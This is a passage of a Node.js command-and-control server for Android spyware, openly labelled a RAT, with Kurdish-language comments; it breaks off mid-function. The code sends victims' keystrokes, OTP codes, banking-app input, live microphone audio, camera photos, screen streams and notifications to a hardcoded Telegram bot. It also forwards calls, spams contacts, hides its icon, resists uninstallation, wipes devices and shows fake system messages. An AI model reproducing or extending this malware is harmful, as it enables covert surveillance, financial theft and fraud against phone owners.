// =====================================================
// 7ASHASHE V40 - ULTIMATE KURDISH RAT
// گەشەپێدەر: 7ASHASHE - وەحشی هاک
// وەشان: 40.0.0 - ULTIMATE KURDISH
// =====================================================

const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const util = require('util');
const exec = util.promisify(require('child_process').exec);

// =====================================================
// 🚀 APP INITIALIZATION
// =====================================================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// =====================================================
// 🔐 CREDENTIALS - 7ASHASHE (تۆکنی نوێ)
// =====================================================
const CONFIG = {
    TOKEN: '8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU',
    CHAT_ID: '5578405082',
    MASTER: '7ASHASHE',
    VERSION: '40.0.0',
    ENCRYPTION_KEY: crypto.randomBytes(32).toString('hex'),
    SESSION_SECRET: crypto.randomBytes(64).toString('hex'),
    PORT: process.env.PORT || 8080,
    MAX_FILE_SIZE: 100 * 1024 * 1024, // 100MB
    PING_INTERVAL: 30000, // 30 seconds
    RECONNECT_TIMEOUT: 5000 // 5 seconds
};

// =====================================================
// 🤖 TELEGRAM BOT INIT
// =====================================================
const bot = new TelegramBot(CONFIG.TOKEN, { polling: true });

// =====================================================
// 📁 DIRECTORY STRUCTURE
// =====================================================
const DIRS = {
    DATA: path.join(__dirname, 'data'),
    PHOTOS: path.join(__dirname, 'data', 'wêne'),
    VIDEOS: path.join(__dirname, 'data', 'vîdyo'),
    AUDIO: path.join(__dirname, 'data', 'deng'),
    FILES: path.join(__dirname, 'data', 'fayl'),
    CONTACTS: path.join(__dirname, 'data', 'peywendî'),
    SMS: path.join(__dirname, 'data', 'sms'),
    CALLS: path.join(__dirname, 'data', 'peywendiyekan'),
    APPS: path.join(__dirname, 'data', 'êpekan'),
    KEYLOGS: path.join(__dirname, 'data', 'klîk'),
    CLIPBOARD: path.join(__dirname, 'data', 'klîpbord'),
    LOCATION: path.join(__dirname, 'data', 'shwên'),
    SCREENSHOTS: path.join(__dirname, 'data', 'screenshot'),
    SCREEN_RECORDS: path.join(__dirname, 'data', 'tômari_şashe'),
    NOTIFICATIONS: path.join(__dirname, 'data', 'notifications'),
    SCREEN_STREAMS: path.join(__dirname, 'data', 'screen_streams'),
    CALL_FORWARDING: path.join(__dirname, 'data', 'call_forwarding'),
    WIFI_CONTROL: path.join(__dirname, 'data', 'wifi_control'),
    CAM_SNAPSHOTS: path.join(__dirname, 'data', 'cam_snapshots'),
    DATABASE: path.join(__dirname, 'data', 'database.json')
};

// Create all directories
Object.values(DIRS).forEach(dir => {
    if (!dir.includes('.json') && !fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
    }
});

// Initialize database
if (!fs.existsSync(DIRS.DATABASE)) {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify({
        clients: {},
        stats: {
            total_connections: 0,
            total_files: 0,
            total_commands: 0,
            notifications_captured: 0,
            screen_streams: 0,
            calls_forwarded: 0,
            messages_spammed: 0,
            cam_snapshots: 0,
            anti_uninstall_attempts: 0,
            sim_changes: 0,
            start_time: new Date().toISOString()
        }
    }, null, 2));
}

// =====================================================
// 📤 MULTER UPLOAD CONFIG
// =====================================================
const upload = multer({ 
    limits: { fileSize: CONFIG.MAX_FILE_SIZE },
    storage: multer.memoryStorage()
});

// =====================================================
// 🔧 UTILITY FUNCTIONS
// =====================================================
const readDB = () => {
    try {
        return JSON.parse(fs.readFileSync(DIRS.DATABASE, 'utf8'));
    } catch (e) {
        return { clients: {}, stats: {} };
    }
};

const writeDB = (data) => {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify(data, null, 2));
};

const encrypt = (data) => {
    const cipher = crypto.createCipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
};

const decrypt = (encrypted) => {
    const decipher = crypto.createDecipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
};

const logToFile = (type, data) => {
    const logFile = path.join(DIRS.LOGS, `${type}_${new Date().toISOString().split('T')[0]}.log`);
    fs.appendFileSync(logFile, `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`);
};

// Store connected clients
const clients = new Map();

// =====================================================
// 🚀 1. سیستمی دژە-سڕینەوە (Anti-Uninstall)
// =====================================================
class AntiUninstall {
    constructor() {
        this.uninstallAttempts = new Map();
    }

    async handleUninstallAttempt(clientId) {
        const attempts = this.uninstallAttempts.get(clientId) || 0;
        this.uninstallAttempts.set(clientId, attempts + 1);
        
        const client = clients.get(clientId);
        if (!client) return;

        // قفڵکردنی مۆبایلەکە
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'lock_device',
                reason: 'uninstall_attempt',
                timestamp: Date.now()
            }));
        }

        // ناردنی ئاگاداری بۆ تێلیگرام
        bot.sendMessage(CONFIG.CHAT_ID,
            `🚫 **⚠️ دژە-سڕینەوە**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `🔢 ژمارەی هەوڵ: ${attempts + 1}\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
            `✅ مۆبایلەکە قفڵ کرا`,
            { parse_mode: 'Markdown' }
        );

        // نوێکردنەوەی ئامارەکان
        const db = readDB();
        db.stats.anti_uninstall_attempts++;
        writeDB(db);
    }
}

const antiUninstall = new AntiUninstall();

// API endpoint for uninstall attempts
app.post('/api/anti-uninstall', (req, res) => {
    const { clientId } = req.body;
    antiUninstall.handleUninstallAttempt(clientId);
    res.json({ success: true });
});

// =====================================================
// 🚀 2. شاردنەوەی ئایکۆن (Icon Hider)
// =====================================================
class IconHider {
    constructor() {
        this.hiddenIcons = new Map();
    }

    async hideIcon(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        // ناردنی فەرمان بۆ شاردنەوەی ئایکۆن
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'hide_icon',
                timestamp: Date.now()
            }));
        }

        this.hiddenIcons.set(clientId, true);

        bot.sendMessage(CONFIG.CHAT_ID,
            `👁️ **🔒 ئایکۆن شاردرایەوە**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
            `✅ ئایکۆن لە لیستی ئەپەکان ون بوو`,
            { parse_mode: 'Markdown' }
        );
    }

    async showIcon(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'show_icon',
                timestamp: Date.now()
            }));
        }

        this.hiddenIcons.delete(clientId);

        bot.sendMessage(CONFIG.CHAT_ID,
            `👁️ **🔓 ئایکۆن دەرکەوتەوە**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'Markdown' }
        );
    }
}

const iconHider = new IconHider();

// =====================================================
// 🚀 3. گوێگرتنی ڕاستەوخۆ (Live Audio Streaming)
// =====================================================
class LiveAudioStream {
    constructor() {
        this.activeStreams = new Map();
    }

    async startAudioStream(clientId, duration = 60) { // duration لە چرکە
        const client = clients.get(clientId);
        if (!client) return;

        const streamId = uuidv4();
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'start_audio_stream',
                streamId,
                duration,
                timestamp: Date.now()
            }));
        }

        this.activeStreams.set(streamId, {
            clientId,
            startedAt: new Date().toISOString(),
            duration,
            active: true
        });

        bot.sendMessage(CONFIG.CHAT_ID,
            `🎤 **🔴 گوێگرتنی ڕاستەوخۆ**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `⏱️ ماوە: ${duration} چرکە\n` +
            `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'Markdown' }
        );

        return streamId;
    }

    async stopAudioStream(streamId) {
        const stream = this.activeStreams.get(streamId);
        if (!stream) return;

        const client = clients.get(stream.clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'stop_audio_stream',
                streamId,
                timestamp: Date.now()
            }));
        }

        stream.active = false;
        this.activeStreams.delete(streamId);

        bot.sendMessage(CONFIG.CHAT_ID,
            `🎤 **⏹️ گوێگرتنی ڕاستەوخۆ وەستا**\n\n` +
            `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'Markdown' }
        );
    }
}

const liveAudioStream = new LiveAudioStream();

// API endpoint for audio stream data
app.post('/api/audio-stream', upload.single('audio'), (req, res) => {
    const { streamId } = req.headers;
    const { buffer } = req.file;

    bot.sendAudio(CONFIG.CHAT_ID, buffer, {
        caption: `🎤 **پارچەی دەنگ**\n\n🆔 Stream: ${streamId.substring(0, 8)}...`,
        parse_mode: 'Markdown'
    });

    res.json({ success: true });
});

// =====================================================
// 🚀 4. سکرینشۆتی زیرەک (Smart Screenshot)
// =====================================================
class SmartScreenshot {
    constructor() {
        this.monitoredApps = new Map();
    }

    async monitorApp(clientId, appName) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'monitor_app',
                app: appName,
                timestamp: Date.now()
            }));
        }

        this.monitoredApps.set(`${clientId}:${appName}`, true);

        bot.sendMessage(CONFIG.CHAT_ID,
            `📸 **👁️ چاودێری ئەپ**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `📱 ئەپ: ${appName}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
            `✅ کاتێک ئەپەکە بکرێتەوە، سکرینشۆت دەگیرێت`,
            { parse_mode: 'Markdown' }
        );
    }

    async stopMonitoring(clientId, appName) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'stop_monitoring',
                app: appName,
                timestamp: Date.now()
            }));
        }

        this.monitoredApps.delete(`${clientId}:${appName}`);
    }
}

const smartScreenshot = new SmartScreenshot();

// =====================================================
// 🚀 5. کۆنترۆڵی کامێرا (Camera Flash Control)
// =====================================================
class CameraFlashControl {
    constructor() {
        this.activeFlash = new Map();
    }

    async takePhoto(clientId, camera = 'back', flash = false) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'take_photo',
                camera,
                flash,
                timestamp: Date.now()
            }));
        }

        bot.sendMessage(CONFIG.CHAT_ID,
            `📸 **📸 وێنەگرتن**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `📷 کامێرا: ${camera === 'back' ? 'پشت' : 'پێش'}\n` +
            `⚡ فلاش: ${flash ? 'بەڵێ' : 'نەخێر'}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'Markdown' }
        );
    }

    async toggleFlash(clientId, enable) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_flash',
                enable,
                timestamp: Date.now()
            }));
        }

        this.activeFlash.set(clientId, enable);
    }
}

const cameraFlashControl = new CameraFlashControl();

// =====================================================
// 🚀 6. دژە-باتری (Battery Bypass)
// =====================================================
class BatteryBypass {
    constructor() {
        this.bypassActive = new Map();
    }

    async enableBypass(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'enable_battery_bypass',
                timestamp: Date.now()
            }));
        }

        this.bypassActive.set(clientId, true);

        bot.sendMessage(CONFIG.CHAT_ID,
            `🔋 **⚡ دژە-باتری چالاک کرا**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
            `✅ سیستەمی پاشەکەوتکردنی وزە ناچالاک کرا`,
            { parse_mode: 'Markdown' }
        );
    }

    async disableBypass(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'disable_battery_bypass',
                timestamp: Date.now()
            }));
        }

        this.bypassActive.delete(clientId);
    }
}

const batteryBypass = new BatteryBypass();

// =====================================================
// 🚀 7. ئاگاداری سیمکارت (SIM Change Alert)
// =====================================================
class SimChangeAlert {
    constructor() {
        this.simInfo = new Map();
    }

    async handleSimChange(clientId, newSimInfo) {
        const client = clients.get(clientId);
        if (!client) return;

        const oldSim = this.simInfo.get(clientId);

        this.simInfo.set(clientId, newSimInfo);

        // وەرگرتنی شوێن
        let location = 'نەزانراو';
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'get_location',
                timestamp: Date.now()
            }));
        }

        bot.sendMessage(CONFIG.CHAT_ID,
            `📱 **⚠️ گۆڕینی سیمکارت**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `📱 سیمی نوێ: ${newSimInfo.number || 'نەزانراو'}\n` +
            `📡 کەریەر: ${newSimInfo.carrier || 'نەزانراو'}\n` +
            `🌍 شوێن: ${location}\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'Markdown' }
        );

        const db = readDB();
        db.stats.sim_changes++;
        writeDB(db);
    }
}

const simChangeAlert = new SimChangeAlert();

// API endpoint for sim change
app.post('/api/sim-change', (req, res) => {
    const { clientId, simInfo } = req.body;
    simChangeAlert.handleSimChange(clientId, simInfo);
    res.json({ success: true });
});

// =====================================================
// 🚀 8. سڕینەوەی داتا (Remote Wipe)
// =====================================================
class RemoteWipe {
    constructor() {
        this.wipeInProgress = new Map();
    }

    async wipeData(clientId, wipeType = 'all') {
        const client = clients.get(clientId);
        if (!client) return;

        bot.sendMessage(CONFIG.CHAT_ID,
            `💥 **⚠️ سڕینەوەی داتا**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `📋 جۆر: ${wipeType === 'all' ? 'هەموو داتاکان' : 'تەنها وێنە'}\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
            `✅ دەستپێکردنی سڕینەوە...`,
            { parse_mode: 'Markdown' }
        );

        this.wipeInProgress.set(clientId, {
            type: wipeType,
            startedAt: new Date().toISOString()
        });

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'wipe_data',
                wipeType,
                timestamp: Date.now()
            }));
        }

        // پاککردنەوەی داتاکانی سێرڤەر
        setTimeout(() => {
            this.wipeInProgress.delete(clientId);
        }, 60000);
    }

    async wipePhotos(clientId) {
        await this.wipeData(clientId, 'photos');
    }

    async wipeAll(clientId) {
        await this.wipeData(clientId, 'all');
    }
}

const remoteWipe = new RemoteWipe();

// =====================================================
// 🚀 9. پەیامی ساختە (Fake Toast)
// =====================================================
class FakeToast {
    constructor() {
        this.toasts = new Map();
    }

    async sendToast(clientId, message, duration = 3000) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'show_toast',
                message,
                duration,
                timestamp: Date.now()
            }));
        }

        bot.sendMessage(CONFIG.CHAT_ID,
            `📱 **💬 پەیامی ساختە نێردرا**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `📝 پەیام: ${message}\n` +
            `⏱️ ماوە: ${duration}ms\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'Markdown' }
        );
    }

    async sendUpdateToast(clientId) {
        await this.sendToast(clientId, '⚠️ سیستم پێویستی بە نوێکردنەوەیە. تکایە نوێ بکەوە', 5000);
    }

    async sendSecurityToast(clientId) {
        await this.sendToast(clientId, '🔒 دۆزینەوەی هەوڵی دزینی زانیاری. تکایە وەڵام بدەرەوە', 5000);
    }
}

const fakeToast = new FakeToast();

// =====================================================
// 🚀 10. سیستمی ڕیستارت (Auto-Boot)
// =====================================================
class AutoBoot {
    constructor() {
        this.bootEnabled = new Map();
    }

    async enableAutoBoot(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'enable_auto_boot',
                timestamp: Date.now()
            }));
        }

        this.bootEnabled.set(clientId, true);

        bot.sendMessage(CONFIG.CHAT_ID,
            `🔄 **⚡ سیستمی ڕیستارت چالاک کرا**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
            `✅ دوای هەر کوژانەوەیەک، ئەپەکە خۆکارانە دەست پێ دەکاتەوە`,
            { parse_mode: 'Markdown' }
        );
    }

    async disableAutoBoot(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'disable_auto_boot',
                timestamp: Date.now()
            }));
        }

        this.bootEnabled.delete(clientId);
    }

    async handleBootComplete(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        bot.sendMessage(CONFIG.CHAT_ID,
            `🔄 **✅ ئامێر دووبارە بووەوە**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
            `✅ ئەپەکە خۆکارانە دەستی پێ کردەوە`,
            { parse_mode: 'Markdown' }
        );
    }
}

const autoBoot = new AutoBoot();

// API endpoint for boot complete
app.post('/api/boot-complete', (req, res) => {
    const { clientId } = req.body;
    autoBoot.handleBootComplete(clientId);
    res.json({ success: true });
});

// =====================================================
// 🚀 NOTIFICATION LISTENER (لە V39ەوە)
// =====================================================
class NotificationListener {
    constructor() {
        this.notifications = [];
        this.listening = false;
    }

    start() {
        this.listening = true;
        console.log('📱 Notification listener started');
    }

    captureNotification(notification) {
        const notif = {
            id: uuidv4(),
            app: notification.app || 'نەزانراو',
            title: notification.title || '',
            text: notification.text || '',
            timestamp: new Date().toISOString()
        };
        
        this.notifications.push(notif);
        
        const notifFile = path.join(DIRS.NOTIFICATIONS, `${Date.now()}_${notif.app}.json`);
        fs.writeFileSync(notifFile, JSON.stringify(notif, null, 2));
        
        const isOTP = notif.text && notif.text.match(/\b\d{4,6}\b/);
        
        if (isOTP) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `💰 **🔐 ئاگاداری OTP**\n\n` +
                `📱 ئەپ: ${notif.app}\n` +
                `📌 ناونیشان: ${notif.title}\n` +
                `📝 پەیام: ${notif.text}\n` +
                `🔢 OTP: ${notif.text.match(/\b\d{4,6}\b/)}\n` +
                `⏰ کات: ${new Date(notif.timestamp).toLocaleString('ckb')}`,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.sendMessage(CONFIG.CHAT_ID,
                `📱 **نۆتیفیکەیشن**\n\n` +
                `📱 ئەپ: ${notif.app}\n` +
                `📌 ناونیشان: ${notif.title}\n` +
                `📝 پەیام: ${notif.text}\n` +
                `⏰ کات: ${new Date(notif.timestamp).toLocaleString('ckb')}`,
                { parse_mode: 'Markdown' }
            );
        }
        
        const db = readDB();
        db.stats.notifications_captured++;
        writeDB(db);
        
        return notif;
    }

    getNotifications() {
        return this.notifications;
    }
}

const notificationListener = new NotificationListener();

// API endpoint for notifications
app.post('/api/notification', (req, res) => {
    const notification = req.body;
    const captured = notificationListener.captureNotification(notification);
    res.json({ success: true, notification: captured });
});

// =====================================================
// 🚀 SCREEN STREAM (لە V39ەوە)
// =====================================================
class ScreenStreamer {
    constructor() {
        this.streams = new Map();
        this.activeStreams = 0;
    }

    async startStream(clientId, options = { quality: 'high', fps: 30 }) {
        try {
            const stream = {
                id: uuidv4(),
                clientId,
                options,
                startedAt: new Date().toISOString(),
                frames: 0,
                active: true
            };
            
            this.streams.set(stream.id, stream);
            this.activeStreams++;
            
            const streamFile = path.join(DIRS.SCREEN_STREAMS, `${stream.id}.json`);
            fs.writeFileSync(streamFile, JSON.stringify(stream, null, 2));
            
            const db = readDB();
            db.stats.screen_streams++;
            writeDB(db);
            
            const client = clients.get(clientId);
            if (client) {
                bot.sendMessage(CONFIG.CHAT_ID,
                    `📹 **Streamی شاشە دەستی پێکرد**\n\n` +
                    `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
                    `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
                    `📊 کوالیتی: ${options.quality}\n` +
                    `🎞️ FPS: ${options.fps}\n` +
                    `🆔 Stream: ${stream.id.substring(0, 8)}...`,
                    { parse_mode: 'Markdown' }
                );
            }
            
            return stream;
        } catch (error) {
            console.error('Screen stream error:', error);
            return null;
        }
    }

    stopStream(streamId) {
        const stream = this.streams.get(streamId);
        if (stream) {
            stream.active = false;
            this.streams.delete(streamId);
            this.activeStreams--;
            
            const duration = Math.floor((Date.now() - new Date(stream.startedAt)) / 1000);
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `⏹️ **Streamی شاشە وەستا**\n\n` +
                `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
                `📊 فرەیم: ${stream.frames}\n` +
                `⏱️ ماوە: ${duration} چرکە`,
                { parse_mode: 'Markdown' }
            );
        }
    }

    getActiveStreams() {
        return Array.from(this.streams.values()).filter(s => s.active);
    }
}

const screenStreamer = new ScreenStreamer();

// API endpoint for screen stream
app.post('/api/screen/stream', (req, res) => {
    const { clientId, options } = req.body;
    screenStreamer.startStream(clientId, options).then(stream => {
        res.json({ success: true, streamId: stream.id });
    });
});

app.post('/api/screen/stop/:streamId', (req, res) => {
    const { streamId } = req.params;
    screenStreamer.stopStream(streamId);
    res.json({ success: true });
});

app.post('/api/screen/frame', (req, res) => {
    const { streamId, frame } = req.body;
    const stream = screenStreamer.streams.get(streamId);
    if (stream && stream.active) {
        stream.frames++;
    }
    res.json({ success: true });
});

// =====================================================
// 🚀 SMART KEYLOGGER (لە V39ەوە)
// =====================================================
class SmartKeylogger {
    constructor() {
        this.logs = [];
        this.activeApps = new Map();
        this.bankingApps = [
            'بەنک', 'بانک', 'کاش', 'پارە', 'کریپتۆ',
            'bank', 'pay', 'crypto', 'wallet', 'cash'
        ];
    }

    logKey(clientId, key, app) {
        const log = {
            id: uuidv4(),
            clientId,
            key,
            app: app || 'سیستەم',
            timestamp: new Date().toISOString(),
            isSensitive: this.isSensitiveApp(app)
        };
        
        this.logs.push(log);
        
        const logFile = path.join(DIRS.KEYLOGS, `${app}_${new Date().toISOString().split('T')[0]}.log`);
        fs.appendFileSync(logFile, `[${log.timestamp}] ${key}\n`);
        
        if (this.isSensitiveApp(app)) {
            const client = clients.get(clientId);
            if (client) {
                bot.sendMessage(CONFIG.CHAT_ID,
                    `💰 **💰 ئاگاداری بانکی**\n\n` +
                    `📱 ئەپ: ${app}\n` +
                    `⌨️ کلیک: ${key}\n` +
                    `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
                    `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
        
        return log;
    }

    isSensitiveApp(app) {
        return this.bankingApps.some(b => app && app.toLowerCase().includes(b.toLowerCase()));
    }

    getLogs(app = null) {
        if (app) {
            return this.logs.filter(l => l.app === app);
        }
        return this.logs;
    }

    startTracking(clientId, app) {
        this.activeApps.set(clientId, app);
        const client = clients.get(clientId);
        if (client) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `⌨️ **کێڤلۆگەری زیرەک دەستی پێکرد**\n\n` +
                `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
                `📱 ئەپ: ${app}\n` +
                `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
                { parse_mode: 'Markdown' }
            );
        }
    }

    stopTracking(clientId) {
        this.activeApps.delete(clientId);
    }

    getBankingLogs() {
        return this.logs.filter(l => l.isSensitive);
    }
}

const smartKeylogger = new SmartKeylogger();

// API endpoint for keylogger
app.post('/api/keylogger', (req, res) => {
    const { clientId, key, app } = req.body;
    smartKeylogger.logKey(clientId, key, app);
    res.json({ success: true });
});

app.post('/api/keylogger/start/:clientId', (req, res) => {
    const { clientId } = req.params;
    const { app } = req.body;
    smartKeylogger.startTracking(clientId, app);
    res.json({ success: true });
});

// =====================================================
// 🚀 CALL FORWARDING (لە V39ەوە)
// =====================================================
class CallForwarding {
    constructor() {
        this.forwardings = new Map();
    }

    forwardCalls(clientId, targetNumber) {
        const client = clients.get(clientId);
        if (!client) return;

        const forwarding = {
            id: uuidv4(),
            clientId,
            targetNumber,
            startedAt: new Date().toISOString(),
            active: true,
            forwardedCalls: 0
        };
        
        this.forwardings.set(forwarding.id, forwarding);
        
        const forwardFile = path.join(DIRS.CALL_FORWARDING, `${forwarding.id}.json`);
        fs.writeFileSync(forwardFile, JSON.stringify(forwarding, null, 2));
        
        const db = readDB();
        db.stats.calls_forwarded++;
        writeDB(db);
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'call_forward',
                target: targetNumber,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `📞 **گواستنەوەی پەیوەندی چالاک کرا**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `📱 ژمارە: ${targetNumber}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
        
        return forwarding;
    }

    stopForwarding(forwardId) {
        const forwarding = this.forwardings.get(forwardId);
        if (forwarding) {
            forwarding.active = false;
            
            const client = clients.get(forwarding.clientId);
            if (client && client.ws.readyState === WebSocket.OPEN) {
                client.ws.send(JSON.stringify({
                    type: 'stop_call_forward',
                    timestamp: Date.now()
                }));
            }
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `⏹️ **گواستنەوەی پەیوەندی وەستا**\n\n` +
                `🆔 Forward: ${forwardId.substring(0, 8)}...\n` +
                `📊 پەیوەندی گواستراوە: ${forwarding.forwardedCalls}`,
                { parse_mode: 'Markdown' }
            );
        }
    }
}

const callForwarding = new CallForwarding();

// =====================================================
// 🚀 CONTACTS SPAM (لە V39ەوە)
// =====================================================
class ContactsSpam {
    constructor() {
        this.activeSpams = new Map();
    }

    async spamAllContacts(clientId, message) {
        const client = clients.get(clientId);
        if (!client) return;

        const spam = {
            id: uuidv4(),
            clientId,
            message,
            startedAt: new Date().toISOString(),
            sent: 0,
            total: 0,
            active: true
        };
        
        this.activeSpams.set(spam.id, spam);
        
        const db = readDB();
        db.stats.messages_spammed++;
        writeDB(db);
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'spam_contacts',
                message,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `📨 **سپامی کۆنتاکتەکان دەستی پێکرد**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `📝 پەیام: ${message}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
        
        return spam;
    }

    updateProgress(spamId, sent, total) {
        const spam = this.activeSpams.get(spamId);
        if (spam) {
            spam.sent = sent;
            spam.total = total;
            
            if (sent >= total) {
                spam.active = false;
                bot.sendMessage(CONFIG.CHAT_ID,
                    `✅ **سپام تەواو بوو**\n\n` +
                    `📊 نێردرا: ${sent}/${total} پەیام`,
                    { parse_mode: 'Markdown' }
                );
                this.activeSpams.delete(spamId);
            }
        }
    }
}

const contactsSpam = new ContactsSpam();

// API endpoint for spam progress
app.post('/api/spam/progress', (req, res) => {
    const { spamId, sent, total } = req.body;
    contactsSpam.updateProgress(spamId, sent, total);
    res.json({ success: true });
});

// =====================================================
// 🚀 APP KILLER (لە V39ەوە)
// =====================================================
class AppKiller {
    constructor() {
        this.blockedApps = new Map();
    }

    killApp(clientId, appPackage) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'kill_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
